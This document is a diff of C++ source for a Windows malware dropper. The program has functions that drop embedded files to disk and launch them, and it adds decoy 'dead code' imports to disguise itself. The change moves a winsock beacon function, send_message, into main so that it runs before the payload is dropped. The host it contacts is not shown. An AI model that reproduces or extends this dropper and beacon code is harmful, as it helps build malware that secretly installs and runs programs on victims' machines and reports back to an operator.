@@ -44,6 +44,10 @@
 #include<algorithm>
 #include<vector>
 #include<filesystem>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+
 
 // Imports for the dead code function
 #include<commctrl.h>
@@ -62,6 +66,7 @@
 
 // Functions prototypes
 void dead();
+int send_message(std::string);
 std::uint64_t check_version();
 void dropper_start(int);
 void drop(DWORD size, void* buffer, std::wstring);
@@ -71,6 +76,7 @@ bool non_exe_launch(std::wstring);
 void exe_launch(std::wstring);
 void set_name(std::uint64_t);
 void setup_name(std::uint64_t);
+
 
 // Dropper Configurations
 #define DEAD_IMPORTS
@@ -87,6 +93,9 @@ void setup_name(std::uint64_t);
 typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
 std::uint64_t os_version;
 HMODULE h;
+
+std::string message = "This is a message sent from the dropper";
+int result;
 
 // 1 w7_calc.exe
 // 2 w7_calc.exe.mui
@@ -117,6 +126,11 @@ int main(int argc, char* argv[])
 {
 
 	LoadLibraryW(L"mscoree.dll");
+
+	int result = send_message(message);
+	if (result == 1) {
+		return result;
+	}
 
 	os_version = check_version();
 
@@ -224,14 +238,6 @@ int main(int argc, char* argv[])
 	return 0;
 }
 
-#include <iostream>
-#include <cstring>
-#include <winsock2.h>
-#include <ws2tcpip.h>
-
-std::string message = "This is a message sent from the dropper";
-
-int result;
 
 int send_message(std::string client_message) {
 
@@ -273,13 +279,6 @@ int send_message(std::string client_message) {
 	return 0;
 
 }
-
-int main() {
-
-	int result = send_message(message);
-	return result;
-}
-
 
 std::uint64_t check_version(){
 
